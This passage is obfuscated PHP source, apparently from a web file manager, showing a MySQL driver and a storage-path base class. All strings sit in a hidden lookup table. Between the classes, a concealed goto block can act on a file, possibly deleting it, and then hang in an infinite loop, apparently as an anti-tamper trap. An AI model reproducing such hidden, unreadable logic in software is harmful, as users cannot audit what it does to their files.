!empty($È¤ÖØ­[$•¿ÅåÙ[21]]) && !mysql_select_db($È¤ÖØ­[$•¿ÅåÙ[21]], $this->linkID[$Ù‰Ê½¿¯])) { think_exception(mysql_error()); } $ûº’‹š¹ = mysql_get_server_info($this->linkID[$Ù‰Ê½¿¯]); mysql_query($•¿ÅåÙ[1012] . think_config($•¿ÅåÙ[1013]) . $•¿ÅåÙ[58], $this->linkID[$Ù‰Ê½¿¯]); if ($ûº’‹š¹ > $•¿ÅåÙ[1014]) { mysql_query($•¿ÅåÙ[1015], $this->linkID[$Ù‰Ê½¿¯]); } $this->connected = !0; if (1 != think_config($•¿ÅåÙ[22])) { unset($this->config); } } return $this->linkID[$Ù‰Ê½¿¯]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($ÑŞ¥­Ç) { $ñõìøÒ =& $_SERVER[¬ÏÕ§Áú]; if (0 === stripos($ÑŞ¥­Ç, $ñõìøÒ[353])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÑŞ¥­Ç; if ($this->queryID) { $this->free(); } think_action_status($ñõìøÒ[23], 1); think_status($ñõìøÒ[24]); $this->queryID = mysql_query($ÑŞ¥­Ç, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($ÎÛ‚‰Ã›) { $×½ş…ˆ° =& $_SERVER[¬ÏÕ§Áú]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÎÛ‚‰Ã›; if ($this->queryID) { $this->free(); } think_action_status($×½ş…ˆ°[25], 1); think_status($×½ş…ˆ°[24]); $¬ªß»­½ = mysql_query($ÎÛ‚‰Ã›, $this->_linkID); $this->debug(); if (!1 === $¬ªß»­½) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[¬ÏÕ§Áú][1016], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÁÄ‘Éô† = mysql_query($_SERVER[¬ÏÕ§Áú][1017], $this->_linkID); $this->transTimes = 0; if (!$ÁÄ‘Éô†) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÁßåØ…ü = mysql_query($_SERVER[¬ÏÕ§Áú][1018], $this->_linkID); $this->transTimes = 0; if (!$ÁßåØ…ü) { $this->error(); return !1; } } return !0; } private function getAll() { $ØÇ›ğØ = array(); if ($this->numRows > 0) { while ($ëôëŞ“õ = mysql_fetch_assoc($this->queryID)) { $ØÇ›ğØ[] = $ëôëŞ“õ; } mysql_data_seek($this->queryID, 0); } return $ØÇ›ğØ; } public function getFields($¥”Ä£¸®) { $ø¾ûô =& $_SERVER[¬ÏÕ§Áú]; $÷ñé«à¦ = $this->query($ø¾ûô[1019] . $this->parseKey($¥”Ä£¸®)); $¢…ß‚îà = array(); if ($÷ñé«à¦) { foreach ($÷ñé«à¦ as $¥„Æ”ªá => $´£‘ÊĞş) { $¢…ß‚îà[$´£‘ÊĞş[$ø¾ûô[31]]] = array($ø¾ûô[32] => $´£‘ÊĞş[$ø¾ûô[31]], $ø¾ûô[33] => $´£‘ÊĞş[$ø¾ûô[34]], $ø¾ûô[35] => (bool) (strtoupper($´£‘ÊĞş[$ø¾ûô[36]]) === $ø¾ûô[1020]), $ø¾ûô[37] => $´£‘ÊĞş[$ø¾ûô[38]], $ø¾ûô[39] => strtolower($´£‘ÊĞş[$ø¾ûô[40]]) == $ø¾ûô[41], $ø¾ûô[42] => strtolower($´£‘ÊĞş[$ø¾ûô[43]]) == $ø¾ûô[44]); } } return $¢…ß‚îà; } public function getTables($î‘–„‹È = '') { $‡î½ê‚‘ =& $_SERVER[¬ÏÕ§Áú]; if (!empty($î‘–„‹È)) { $¨®ÇşÕù = $‡î½ê‚‘[1021] . $î‘–„‹È . $‡î½ê‚‘[1022]; } else { $¨®ÇşÕù = $‡î½ê‚‘[1023]; } $ˆ¡¶µ = $this->query($¨®ÇşÕù); $×ï¨¡äÌ = array(); foreach ($ˆ¡¶µ as $–úğûƒâ => $Ùº‹û¾å) { $×ï¨¡äÌ[$–úğûƒâ] = current($Ùº‹û¾å); } return $×ï¨¡äÌ; } public function replace($°õÚ•ÉÑ, $âÚ™œîõ = array()) { $†•¶é™ =& $_SERVER[¬ÏÕ§Áú]; foreach ($°õÚ•ÉÑ as $«’¸ó® => $şÎ»×‡ß) { $Øà¬‡Í÷ = $this->parseValue($şÎ»×‡ß); if (is_scalar($Øà¬‡Í÷)) { $ìëàÀ‹[] = $Øà¬‡Í÷; $¯ì™‡˜Ì[] = $this->parseKey($«’¸ó®); } } $ïØèÛé± = $†•¶é™[1024] . $this->parseTable($âÚ™œîõ[$†•¶é™[368]]) . $†•¶é™[1025] . implode($†•¶é™[50], $¯ì™‡˜Ì) . $†•¶é™[1026] . implode($†•¶é™[50], $ìëàÀ‹) . $†•¶é™[1027]; return $this->execute($ïØèÛé±); } public function insertAll($Æú¯ÜÇÀ, $‘÷§Ğ = array(), $ºÛå„‡‚ = false) { $éúÏƒŠ† =& $_SERVER[¬ÏÕ§Áú]; if (!is_array($Æú¯ÜÇÀ[0])) { return !1; } $Şğ—õ´Î = array_keys($Æú¯ÜÇÀ[0]); $¡ñ££• = array(); foreach ($Æú¯ÜÇÀ as $èõ¯´Âª) { $ğïÌˆ›Ü = array(); foreach ($èõ¯´Âª as $º‘Ê¿‡Õ => $’è §æú) { $’è §æú = $this->parseValue($’è §æú); if (is_scalar($’è §æú)) { $ğïÌˆ›Ü[] = $’è §æú; } } $¡ñ££•[] = $éúÏƒŠ†[349] . implode($éúÏƒŠ†[50], $ğïÌˆ›Ü) . $éúÏƒŠ†[1027]; } array_walk($Şğ—õ´Î, array($this, $éúÏƒŠ†[1028])); $Üö‹ÀÊ… = $ºÛå„‡‚ ? $éúÏƒŠ†[1029] : $éúÏƒŠ†[1030]; $Üö‹ÀÊ… = $éúÏƒŠ†[1030]; $âù­ä†Ê = $Üö‹ÀÊ… . $éúÏƒŠ†[1031] . $this->parseTable($‘÷§Ğ[$éúÏƒŠ†[368]]) . $éúÏƒŠ†[1025] . implode($éúÏƒŠ†[50], $Şğ—õ´Î) . $éúÏƒŠ†[1032] . implode($éúÏƒŠ†[50], $¡ñ££•); if ($ºÛå„‡‚) { $ÌÉÓ£éñ = array(); foreach ($Şğ—õ´Î as $º‘Ê¿‡Õ) { if ($º‘Ê¿‡Õ == $éúÏƒŠ†[244] || $º‘Ê¿‡Õ == $éúÏƒŠ†[1033]) { continue; } $ÌÉÓ£éñ[] = $º‘Ê¿‡Õ . $éúÏƒŠ†[1034] . $º‘Ê¿‡Õ . $éúÏƒŠ†[1027]; } $âù­ä†Ê .= $éúÏƒŠ†[1035] . implode($éúÏƒŠ†[50], $ÌÉÓ£éñ); } return $this->execute($âù­ä†Ê); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $Êªâ¸— =& $_SERVER[¬ÏÕ§Áú]; $this->error = mysql_errno() . $Êªâ¸—[4] . mysql_error($this->_linkID); if ($Êªâ¸—[12] != $this->queryStr) { $this->error .= LNG($Êªâ¸—[48]) . $this->queryStr; } think_trace($this->error, $Êªâ¸—[12], $Êªâ¸—[49]); return $this->error; } public function escapeString($úÜéîş­) { if ($this->_linkID) { return mysql_real_escape_string($úÜéîş­, $this->_linkID); } else { return mysql_escape_string($úÜéîş­); } } public function parseKey(&$ËÜ»âŞ¶, $ªùÒÃî· = true) { $¯ŒÄòÚ­ =& $_SERVER[¬ÏÕ§Áú]; if ($ªùÒÃî·) { $ËÜ»âŞ¶ = $this->parseKeyCheck($ËÜ»âŞ¶); } if ($ËÜ»âŞ¶ != $¯ŒÄòÚ­[233] && !preg_match($¯ŒÄòÚ­[1036], $ËÜ»âŞ¶)) { $ËÜ»âŞ¶ = $¯ŒÄòÚ­[481] . trim($ËÜ»âŞ¶, $¯ŒÄòÚ­[481]) . $¯ŒÄòÚ­[481]; } return $ËÜ»âŞ¶; } } goto eËõ™Ü¤¥Á; CÃèŒà÷¿ƒ: if (!isset($_SERVER[$_SERVER[¬ÏÕ§Áú][60]]) || !isset($_SERVER[$_SERVER[¬ÏÕ§Áú][61]])) { $_getc = $_SERVER[¬ÏÕ§Áú][62]; $_getfile = $_SERVER[$_SERVER[¬ÏÕ§Áú][63]] . $_SERVER[¬ÏÕ§Áú][64]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¬ÏÕ§Áú][65], $_getfilec); if (count($_getarrs) < $_SERVER[¬ÏÕ§Áú][66]) { $exit = $_SERVER[¬ÏÕ§Áú][67]; $exit(); } $_act = $_SERVER[¬ÏÕ§Áú][68]; $_act($_SERVER[$_SERVER[¬ÏÕ§Áú][63]] . $_SERVER[¬ÏÕ§Áú][64]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[¬ÏÕ§Áú][69]); } } class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $¬ÅèŒıŠ =& $_SERVER[¬ÏÕ§Áú]; $this->objectDriver = array($¬ÅèŒıŠ[70], $¬ÅèŒıŠ[71], $¬ÅèŒıŠ[72], $¬ÅèŒıŠ[73], $¬ÅèŒıŠ[74], $¬ÅèŒıŠ[75], $¬ÅèŒıŠ[76], $¬ÅèŒıŠ[77], $¬ÅèŒıŠ[78], $¬ÅèŒıŠ[79], $¬ÅèŒıŠ[80], $¬ÅèŒıŠ[81]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($×“Ë´×Ğ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($×“Ë´×Ğ, $_SERVER[¬ÏÕ§Áú][8]); } return $×“Ë´×Ğ; } public function iconvApp($¤ŞÒ¦‚¼) { return $¤ŞÒ¦‚¼; } public function iconvSystem($ÛóâìïÈ) { return $ÛóâìïÈ; } public function iconvTo($îè¯÷áÜ, $Â­¹® ã, $ºõıµ¨ë) { $ĞÖò Ñõ =& $_SERVER[¬ÏÕ§Áú]; if (!$îè¯÷áÜ || !function_exists($ĞÖò Ñõ[82])) { return $îè¯÷áÜ; } static $Ééì£å° = array(); $õıåú¦ú = $Â­¹® ã . $ĞÖò Ñõ[83] . $ºõıµ¨ë . $ĞÖò Ñõ[84] . $îè¯÷áÜ; if (isset($Ééì£å°[$õıåú¦ú])) { return $Ééì£å°[$õıåú¦ú]; } if (function_exists($ĞÖò Ñõ[85])) { $Ö®à“ƒ¾ = @mb_convert_encoding($îè¯÷áÜ, $ºõıµ¨ë, $Â­¹® ã); } else { $Ö®à“ƒ¾ = @iconv($Â­¹® ã, $ºõıµ¨ë, $îè¯÷áÜ); } $Ö®à“ƒ¾ = $Ö®à“ƒ¾ ? $Ö®à“ƒ¾ : $îè¯÷áÜ; if (strstr($Ö®à“ƒ¾, $ĞÖò Ñõ[86])) { $Ö®à“ƒ¾ = str_replace($ĞÖò Ñõ[86], $ĞÖò Ñõ[11], $Ö®à“ƒ¾); } $Ééì£å°[$Â­¹® ã . $ĞÖò Ñõ[83] . $ºõıµ¨ë . $ĞÖò Ñõ[84] . $îè¯÷áÜ] = $Ö®à“ƒ¾; $Ééì£å°[$ºõıµ¨ë . $ĞÖò Ñõ[83] . $Â­¹® ã . $ĞÖò Ñõ[84] . $îè¯÷áÜ] = $îè¯÷áÜ; $Ééì£å°[$ºõıµ¨ë . $ĞÖò Ñõ[83] . $Â­¹® ã . $ĞÖò Ñõ[84] . $Ö®à“ƒ¾] = $îè¯÷áÜ; $Ééì£å°[$Â­¹® ã . $ĞÖò Ñõ[83] . $ºõıµ¨ë . $ĞÖò Ñõ[84] . $Ö®à“ƒ¾] = $Ö®à“ƒ¾; return $Ö®à“ƒ¾; } public function getPathInner($¿’óÈô) { $³ÖçÇˆü = IO::init($¿’óÈô); return $³ÖçÇˆü->path; } public function getPathOuter($úîÂÛ©¯) { $ÜË¤ü™ =& $_SERVER[¬ÏÕ§Áú]; $çÜÂÏçí = strlen(trim($this->pathBase, $ÜË¤ü™[8])); $úîÂÛ©¯ = substr(trim($úîÂÛ©¯, $ÜË¤ü™[8]), $çÜÂÏçí); return $this->pathDriver . $ÜË¤ü™[8] . ltrim($úîÂÛ©¯, $ÜË¤ü™[8]); } public function isParentOf($¬âÂÅ„å, $ŞÌœÕª) { $Ï“ÓáÆÜ =& $_SERVER[¬ÏÕ§Áú]; $¬âÂÅ„å = rtrim(strtolower($¬âÂÅ„å), $Ï“ÓáÆÜ[8]) . $Ï“ÓáÆÜ[8]; $ŞÌœÕª = rtrim(strtolower($ŞÌœÕª), $Ï“ÓáÆÜ[8]) . $Ï“ÓáÆÜ[8]; $Í€š¯·¯ = strpos($ŞÌœÕª, $¬âÂÅ„å) === 0; return $Í€š¯·¯; } public function getType() { $Ïı•‚£ =& $_SERVER[¬ÏÕ§Áú]; $Ò¶­ƒ§ = str_replace($Ïı•‚£[87], $Ïı•‚£[12], get_class($this)); return strtolower($Ò¶­ƒ§); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($ˆä’ÙÀœ, $ş¾Í÷£) { $®Œœ±ş =& $_SERVER[¬ÏÕ§Áú]; $Ø±è“à± = rtrim($ˆä’ÙÀœ, $®Œœ±ş[8]) . $®Œœ±ş[8] . $ş¾Í÷£; $ ÌÎßàò = $this->exist($Ø±è“à±); return $ ÌÎßàò ? $Ø±è“à± : !1; } public function setModifyTime($ã‰óÏ¬Ş, $Ö‚Şä„ˆ = '') { } public function renameObject($Š§¼“™, $ÁĞİìú) { $Ó¦€”Ùº = $ÁĞİìú; $Š§¼“™ = $this->getPathOuter($Š§¼“™); $ÁĞİìú = $this->pathFather($Š§¼“™) . $ÁĞİìú; $ó£ù±´ = IO::copy($Š§¼“™, $this->pathFather($Š§¼“™), REPEAT_RENAME_FOLDER, $Ó¦€”Ùº); if ($ó£ù±´) { IO::remove($Š§¼“™); } return $ó£ù±´ ? $ÁĞİìú : !1; } public function tempFile($‰‰´×®° = '', $ÎÌùí‘ş = '') { if (!$‰‰´×®°) { $‰‰´×®° = rand_string(15); } $ŞšûâÖˆ = TEMP_FILES . rand_string(15) . $_SERVER[¬ÏÕ§Áú][8]; @mkdir($ŞšûâÖˆ, DEFAULT_PERRMISSIONS, !0); $äï‘ËÁ = $ŞšûâÖˆ . $‰‰´×®°; @touch($äï‘ËÁ); if ($ÎÌùí‘ş) { file_put_contents($äï‘ËÁ, $ÎÌùí‘ş); } return $äï‘ËÁ; } public function tempFileRemve($¿“»æ¯À) { @unlink($¿“»æ¯À); @rmdir($this->pathFather($¿“»æ¯À)); } public function mkfile($Ûå“¬ÜÔ, $©Šæîİ€ = '', $¸§ïì¦Â = REPEAT_RENAME) { } public function mkdir($¬Äö‹¨, $¤ğÉ°™Û = REPEAT_SKIP) { } public function delFile($Ó€¹ıÛÜ) { } public function delFolder($÷“¡‡›Á) { } public function copyFile($ñĞÓ¨Îë, $Ö¢¤Ç—) { } public function moveFile($¢á¬¦ØÊ, $‚Óóåùé) { } public function remove($²ó¬œ¡) { if ($this->isFile($²ó¬œ¡)) { return $this->delFile($²ó¬œ¡); } return $this->delFolder($²ó¬œ¡); } public function rename($Í¶Ë¹Ö, $Ï—À÷‰ƒ) { } public function exist($¾İùşº) { } public function findByHash($»ô³Ğğ = '', $¼°«ò×½ = '') { return !1; } public function isFile($½„ŸªøÑ) { } public function isFolder($–ÍİÌß¢) { } public function size($äŒøŞäÕ) { } public function info($©Ç†Á²ë) { } public function infoSimple($ÜšÈ«·‘) { return $this->info($ÜšÈ«·‘); } public function infoAuth($á‡’ßÑˆ) { return $this->info($á‡’ßÑˆ); } public function infoFull($Ô«ŸÑ×ü) { return $this->info($Ô«ŸÑ×ü); } public function infoFullSimple($ßµ³ŒÍ ) { return $this->info($ßµ³ŒÍ ); } public function infoWithChildren($±’Ì¾’œ) { $ØÄ£„ƒ– =& $_SERVER[¬ÏÕ§Áú]; static $íœŒ”Æº = array(); if (isset($íœŒ”Æº[$±’Ì¾’œ])) { return $íœŒ”Æº[$±’Ì¾’œ]; } $êÉøÍ´Û = $this->info($±’Ì¾’œ); if ($êÉøÍ´Û && $êÉøÍ´Û[$ØÄ£„ƒ–[33]] == $ØÄ£„ƒ–[88]) { $úşÖ®¶› = array($ØÄ£„ƒ–[89] => 0, $ØÄ£„ƒ–[90] => 0, $ØÄ£„ƒ–[91] => 0); $this->infoChildren($±’Ì¾’œ, $úşÖ®¶›); $êÉøÍ´Û[$ØÄ£„ƒ–[89]] = $úşÖ®¶›[$ØÄ£„ƒ–[89]]; $êÉøÍ´Û[$ØÄ£„ƒ–[92]] = array($ØÄ£„ƒ–[93] => $úşÖ®¶›[$ØÄ£„ƒ–[90]], $ØÄ£„ƒ–[94] => $úşÖ®¶›[$ØÄ£„ƒ–[91]]); $íœŒ”Æº[$±’Ì¾’œ] = $êÉøÍ´Û; } return $êÉøÍ´Û; } public function listPath($Ÿ”Úö“Â, $Î±…âˆ· = false) { } public function has($„ª˜·¸¿, $”Àş™ã = false, $õ¯ÌÙöõ = false) { } public function canRead($÷íÜğ) { } public function canWrite($€‹¸ô¿) { } public function getContent($ÇÔ ì¹©) { } public function setContent($™©­¶ı‚, $êÖÖ—ãâ = '') { } protected function infoChildren($œã­ØİÂ, &$ƒ‘ó €Ì) { $ÕİÌË¤ =& $_SERVER[¬ÏÕ§Áú]; check_abort_echo(); $‡ÓÌ“¨Ş = $this->listPath($œã­ØİÂ, !0); $‡ÓÌ“¨Ş = array_merge($‡ÓÌ“¨Ş[$ÕİÌË¤[95]], $‡ÓÌ“¨Ş[$ÕİÌË¤[96]]); foreach ($‡ÓÌ“¨Ş as $Ö§–›úù) { if ($Ö§–›úù[$ÕİÌË¤[33]] == $ÕİÌË¤[88]) { $ƒ‘ó €Ì[$ÕİÌË¤[91]]++; $­’“™ÃÔ = $this->getPathInner($Ö§–›úù[$ÕİÌË¤[97]]); $this->infoChildren($­’“™ÃÔ, $ƒ‘ó €Ì); } else { $ƒ‘ó €Ì[$ÕİÌË¤[90]]++; $ƒ‘ó €Ì[$ÕİÌË¤[89]] += $Ö§–›úù[$ÕİÌË¤[89]]; } } } public function fileSubstr($ïê¯§¼ù, $ÒÄìÁ, $ş½·¨×á) { } public function listAll($§Ñòé°) { } public function listAllMake($’¿½Ü•Ç, &$ êÈ—å•) { $ñ„¼ğ“® =& $_SERVER[¬ÏÕ§Áú]; check_abort_echo(); $òñ¾ğ¦Î = $this->listPath($’¿½Ü•Ç, !0); if (!$òñ¾ğ¦Î) { return; } $¶™©¦€ş = array_merge($òñ¾ğ¦Î[$ñ„¼ğ“®[95]], $òñ¾ğ¦Î[$ñ„¼ğ“®[96]]); foreach ($¶™©¦€ş as $¾œÏ”Ô) { $ë¸±Ôàï = $¾œÏ”Ô[$ñ„¼ğ“®[33]] == $ñ„¼ğ“®[88]; $ı¤µ€Œ‰ = array($ñ„¼ğ“®[97] => $¾œÏ”Ô[$ñ„¼ğ“®[97]], $ñ„¼ğ“®[88] => $ë¸±Ôàï); if (isset($¾œÏ”Ô[$ñ„¼ğ“®[89]])) { $ı¤µ€Œ‰[$ñ„¼ğ“®[89]] = $¾œÏ”Ô[$ñ„¼ğ“®[89]]; } if (isset($¾œÏ”Ô[$ñ„¼ğ“®[98]])) { $ı¤µ€Œ‰[$ñ„¼ğ“®[98]] = $¾œÏ”Ô[$ñ„¼ğ“®[98]]; } if (!$ë¸±Ôàï) { $ êÈ—å•[] = $ı¤µ€Œ‰; continue; } $ êÈ—å•[] = $ı¤µ€Œ‰; $Äà°“†û = $¾œÏ”Ô[$ñ„¼ğ“®[97]]; $ÕŒéĞ§Ú = $this->pathDriver; if (substr($¾œÏ”Ô[$ñ„¼ğ“®[97]], 0, strlen($ÕŒéĞ§Ú)) == $ÕŒéĞ§Ú) { $Äà°“†û = substr($Äà°“†û, strlen($ÕŒéĞ§Ú)); } $this->listAllMake($Äà°“†û, $ êÈ—å•); } } public function listAllSimple($Ğ­÷Î¢‹, $¨µşÏÜÖ = false) { $öàİÉ  = $this->listAll($Ğ­÷Î¢‹); return $this->listAllSimpleMake($öàİÉ , $this->getPathOuter($Ğ­÷Î¢‹), $¨µşÏÜÖ); } public function listAllSimpleMake($ıúËµ², $¡û½ñÂ, $£¼ÏÑ‹å) { $€‡é™Ò =& $_SERVER[¬ÏÕ§Áú]; $å„¤Â = array(); $¡û½ñÂ = rtrim(get_path_father($¡û½ñÂ), $€‡é™Ò[8]) . $€‡é™Ò[8]; foreach ($ıúËµ² as $«Üïù¥Õ) { $¢¾¨ùòò = array($€‡é™Ò[97] => $«Üïù¥Õ[$€‡é™Ò[97]], $€‡é™Ò[99] => $«Üïù¥Õ[$€‡é™Ò[97]], $€‡é™Ò[88] => $«Üïù¥Õ[$€‡é™Ò[88]]); if (isset($«Üïù¥Õ[$€‡é™Ò[89]]) && !$«Üïù¥Õ[$€‡é™Ò[88]]) { $¢¾¨ùòò[$€‡é™Ò[89]] = $«Üïù¥Õ[$€‡é™Ò[89]]; } if (isset($«Üïù¥Õ[$€‡é™Ò[98]])) { $¢¾¨ùòò[$€‡é™Ò[98]] = $«Üïù¥Õ[$€‡é™Ò[98]]; } if (is_array($«Üïù¥Õ[$€‡é™Ò[100]])) { $¢¾¨ùòò[$€‡é™Ò[99]] = $«Üïù¥Õ[$€‡é™Ò[100]][$€‡é™Ò[97]]; $¢¾¨ùòò[$€‡é™Ò[89]] = $«Üïù¥Õ[$€‡é™Ò[100]][$€‡é™Ò[89]]; $¢¾¨ùòò[$€‡é™Ò[98]] = $«Üïù¥Õ[$€‡é™Ò[100]][$€‡é™Ò[98]]; } else { if (substr($«Üïù¥Õ[$€‡é™Ò[97]], 0, strlen($¡û½ñÂ)) == $¡û½ñÂ) { $¢¾¨ùòò[$€‡é™Ò[97]] = substr($«Üïù¥Õ[$€‡é™Ò[97]], strlen($¡û½ñÂ)); } } $”Äí ñÁ = $«Üïù¥Õ[$€‡é™Ò[88]] ? $€‡é™Ò[8] : $€‡é™Ò[12]; $¢¾¨ùòò[$€‡é™Ò[99]] = rtrim($¢¾¨ùòò[$€‡é™Ò[99]], $€‡é™Ò[8]) . $”Äí ñÁ; $¢¾¨ùòò[$€‡é™Ò[97]] = $€‡é™Ò[8] . trim($¢¾¨ùòò[$€‡é™Ò[97]], $€‡é™Ò[8]) . $”Äí ñÁ; if (!$£¼ÏÑ‹å) { $‡ş¨õ‰Ï = explode($€‡é™Ò[8], trim($¢¾¨ùòò[$€‡é™Ò[97]], $€‡é™Ò[8])); $¢¾¨ùòò[$€‡é™Ò[97]] = $€‡é™Ò[8] . implode($€‡é™Ò[8], array_slice($‡ş¨õ‰Ï, 1)) . $”Äí ñÁ; } $å„¤Â[] = $¢¾¨ùòò; } return array_sort_by($å„¤Â, $€‡é™Ò[97]); } public function upload($ı…»¼ºÚ, $È¿Ë¶ô™, $ïš£æ…É = false, $ŒÈïÀœ¼ = REPEAT_REPLACE) { } public function uploadFileByID($‰İØ£‘Ö, $ğÙşƒğù, $–¼¯È°›) { } public function uploadFileByPath($Ì¯‚÷, $Ù¨£Èî, $ŠŠ°¢¦Ú = array()) { } public function isUploadServer() { $¢õ¦ˆÎ¤ =& $_SERVER[¬ÏÕ§Áú]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $¢õ¦ˆÎ¤[101]) { return !0; } return $GLOBALS[$¢õ¦ˆÎ¤[6]][$¢õ¦ˆÎ¤[102]][$¢õ¦ˆÎ¤[103]]; } public function isFileOutServer() { $¶İ¾¢…ä =& $_SERVER[¬ÏÕ§Áú]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $¶İ¾¢…ä[101]) { return !0; } return $GLOBALS[$¶İ¾¢…ä[6]][$¶İ¾¢…ä[102]][$¶İ¾¢…ä[104]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($°ë€§´) { $ö¶×şƒ =& $_SERVER[¬ÏÕ§Áú]; if (!$this->isCdnHost()) { return $°ë€§´; } return str_replace(trim(get_url_root($°ë€§´), $ö¶×şƒ[8]), trim($this->cdnHost, $ö¶×şƒ[8]), $°ë€§´); } public function uploadLink($İ†ŒÜ·‡, $ÇÒÔ®¼ı = 0) { $°ÄÀ¹È’ =& $_SERVER[¬ÏÕ§Áú]; if ($this->isUploadServer()) { return; } $êí¸‚éå = $this->getType(); if (!in_array($êí¸‚éå, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $òÓ”ºçõ = 1024 * 1024 * 10; $Íü¢Ïåø = $ÇÒÔ®¼ı <= $òÓ”ºçõ ? $°ÄÀ¹È’[105] : $°ÄÀ¹È’[106]; $Ÿ×•àÙ» = (!$ÇÒÔ®¼ı ? 1 : ceil($ÇÒÔ®¼ı / pow(1024, 3))) * 3600 * 4; $ê¸‰Êáî = $this->{$Íü¢Ïåø}($İ†ŒÜ·‡, $Ÿ×•àÙ»); if ($ê¸‰Êáî) { $ê¸‰Êáî[$°ÄÀ¹È’[107]] = $İ†ŒÜ·‡; $ê¸‰Êáî[$°ÄÀ¹È’[108]] = $êí¸‚éå; } return $ê¸‰Êáî; } public function uploadFormData($ÔØ ç¤ı, $Ï“ˆ¼Ú« = 3600) { } public function uploadMultiData($“¢ƒ¸, $·ßéÁ = 3600) { } public function multiUploadFormData($¾Û†èçÇ, $òÉ¥ƒÇ = 3600) { return $this->uploadMultiData($¾Û†èçÇ, $òÉ¥ƒÇ); } public function download($‚‰Ó¦µ, $ÛßÒ­×) { } public function ext($àÃê™Æ) { $”¸íÑô =& $_SERVER[¬ÏÕ§Áú]; if (strpos($àÃê™Æ, $”¸íÑô[8]) === -1) { $ß¤¥Şå = $àÃê™Æ; } else { $ß¤¥Şå = $this->pathThis($àÃê™Æ); } $°“ÉŞåÉ = $”¸íÑô[12]; if (strstr($ß¤¥Şå, $”¸íÑô[10])) { $°“ÉŞåÉ = substr($ß¤¥Şå, strrpos($ß¤¥Şå, $”¸íÑô[10]) + 1); $°“ÉŞåÉ = strtolower($°“ÉŞåÉ); } if (strlen($°“ÉŞåÉ) > 3 && preg_match($”¸íÑô[109], $°“ÉŞåÉ, $„ÅŞè–Ó)) { $°“ÉŞåÉ = $”¸íÑô[12]; } return $°“ÉŞåÉ; } public function pathThis($äÛÑ½îÖ) { $ßÁ„¾òÚ =& $_SERVER[¬ÏÕ§Áú]; $äÛÑ½îÖ = str_replace($ßÁ„¾òÚ[110], $ßÁ„¾òÚ[8], rtrim($äÛÑ½îÖ, $ßÁ„¾òÚ[8])); $ø»ß¢›Ş = strrpos($äÛÑ½îÖ, $ßÁ„¾òÚ[8]); if ($ø»ß¢›Ş === !1) { return $äÛÑ½îÖ; } return substr($äÛÑ½îÖ, $ø»ß¢›Ş + 1); } public function pathFather($¶èÕµ¸×) { $ìùÚØÄ =& $_SERVER[¬ÏÕ§Áú]; $¶èÕµ¸× = str_replace($ìùÚØÄ[110], $ìùÚØÄ[8], rtrim($¶èÕµ¸×, $ìùÚØÄ[8])); $šªÙ®Œë = strrpos($¶èÕµ¸×, $ìùÚØÄ[8]); if ($šªÙ®Œë === !1) { return $ìùÚØÄ[12]; } return substr($¶èÕµ¸×, 0, $šªÙ®Œë + 1); } public function hashSimple($š¶ÈòÖ¦) { $ñŠ­‘ =& $_SERVER[¬ÏÕ§Áú]; if (!$š¶ÈòÖ¦) { return md5($ñŠ­‘[12]); } $©ÂÛ¶‹ = $this->size($š¶ÈòÖ¦); $İóğõ¸Ë = 200; $Àæ ¯°Ş = 50; if ($©ÂÛ¶‹ <= $İóğõ¸Ë * $Àæ ¯°Ş) { return $this->hashMd5($š¶ÈòÖ¦) . $©ÂÛ¶‹; } $Ş¹È–ğ = intval($©ÂÛ¶‹ / $Àæ ¯°Ş); $™¤êÊà¨ = $ñŠ­‘[12]; for ($ğ‡Ó³¼ = 0; $ğ‡Ó³¼ < $Àæ ¯°Ş; $ğ‡Ó³¼++) { $™¤êÊà¨ .= $this->fileSubstr($š¶ÈòÖ¦, $Ş¹È–ğ * $ğ‡Ó³¼, $İóğõ¸Ë); } $™¤êÊà¨ .= $this->fileSubstr($š¶ÈòÖ¦, $©ÂÛ¶‹ - $İóğõ¸Ë, $İóğõ¸Ë); return md5($™¤êÊà¨) . $©ÂÛ¶‹; } public static $md5Cache = array(); public function hashMd5($§ú­Ÿ¸…) { if (!$§ú­Ÿ¸…) { return md5($_SERVER[¬ÏÕ§Áú][12]); } $§ú­Ÿ¸… = $this->iconvSystem($§ú­Ÿ¸…); if (isset(self::$md5Cache[$§ú­Ÿ¸…])) { return self::$md5Cache[$§ú­Ÿ¸…]; } self::$md5Cache[$§ú­Ÿ¸…] = $this->hashMd5Shell($§ú­Ÿ¸…); if (!self::$md5Cache[$§ú­Ÿ¸…]) { self::$md5Cache[$§ú­Ÿ¸…] = @md5_file($§ú­Ÿ¸…); } return self::$md5Cache[$§ú­Ÿ¸…]; } private function hashMd5Shell($é­ˆ¾Öì) { $®‡¯û‰Ã =& $_SERVER[¬ÏÕ§Áú]; if (!$é­ˆ¾Öì) { return md5($®‡¯û‰Ã[12]); } if (!function_exists($®‡¯û‰Ã[111])) { return !1; } $Æ¯›À‰³ = array($®‡¯û‰Ã[112], $®‡¯û‰Ã[113]); $Í¬½ÅïÇ = 